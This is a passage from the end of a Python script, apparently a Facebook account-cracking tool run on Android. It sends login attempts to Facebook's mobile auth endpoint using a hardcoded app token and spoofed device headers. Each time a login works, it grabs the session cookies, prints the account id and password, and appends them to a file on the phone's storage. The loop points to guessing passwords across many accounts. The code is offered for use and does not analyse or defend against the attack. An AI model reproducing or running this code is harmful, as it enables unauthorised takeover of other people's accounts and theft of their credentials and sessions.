            head = {'User-Agent': uam, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head, allow_redirects=False).json()
            if 'access_token' in po:
                coki = po['session_cookies']
                cok = {}
                for x in coki:
                    cok.update({x['name']: x['value']})
                kuki = ';'.join(['%s=%s' % (key, value) for key, value in cok.items()])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r\033[1;97m[\033[1;92mMUHIB-OK\033[1;97m]\033[1;32m ' + uid + f' | ' + pas + f'     ')
                oks.append(uid)
                open('/sdcard/MUHIB-OKS.txt', 'a').write(uid + ' | ' + pas + '\n')
                break
        loop += 1
    except Exception as e:
        return None

__main__()
